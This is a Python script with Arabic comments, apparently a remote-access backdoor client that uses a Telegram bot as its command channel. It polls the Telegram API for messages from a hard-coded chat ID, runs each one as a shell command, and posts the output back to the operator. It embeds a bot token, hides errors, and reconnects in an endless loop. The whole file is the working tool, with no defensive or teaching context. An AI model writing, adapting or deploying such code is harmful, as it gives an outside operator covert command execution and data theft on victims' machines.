import requests, subprocess, time

TOKEN = "8508402230:AAGK5iP1fxc7Dscu5pDmqWkAGLCCYLtKrB0"
CHAT_ID = "8897834377"
BASE = "https://api.telegram.org/bot" + TOKEN


offset = 0

def send(text):
    # تقسيم الرسائل الطويلة (حد تيليجرام 4096)
    for i in range(0, len(text), 4000):
        try:
            requests.post(f"{BASE}/sendMessage",
                          data={"chat_id": CHAT_ID, "text": text[i:i+4000]})
        except Exception:
            pass

def run(cmd):
    try:
        out = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
        return (out.stdout + out.stderr).decode(errors="replace")
    except subprocess.TimeoutExpired:
        return "[!] انتهت مهلة التنفيذ (60 ثانية)"

send("[+] العميل متصل")

while True:
    try:
        r = requests.get(f"{BASE}/getUpdates",
                         params={"offset": offset + 1, "timeout": 30}, timeout=35).json()
        for upd in r.get("result", []):
            offset = upd["update_id"]
            msg = upd.get("message", {})
            if str(msg.get("chat", {}).get("id")) != CHAT_ID:
                continue
            cmd = msg.get("text", "").strip()
            if cmd == "/exit":
                send("[+] إغلاق"); raise SystemExit
            if cmd:
                send(run(cmd) or "[لا يوجد مخرجات]")
    except SystemExit:
        break
    except Exception:
        time.sleep(5)
